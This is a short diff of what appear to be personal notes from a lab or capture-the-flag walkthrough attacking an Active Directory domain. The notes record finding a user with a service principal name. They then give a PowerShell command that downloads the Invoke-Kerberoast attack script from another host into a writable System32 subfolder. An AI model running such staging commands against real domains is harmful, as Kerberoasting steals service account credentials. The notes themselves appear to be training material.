@@ -69,4 +69,16 @@ CN=fela,CN=Users,DC=corp,DC=local
 
 Existing SPN found!
 
+So, a SPN is found.
+User is: fela
+
+3. 
+
+$URL="http://10.10.196.242:9000/Invoke-Kerberoast.ps1"
+$PATH = "C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1"
+Invoke-WebRequest -URI $URL -OutFile $Path
+
+
+
+
 
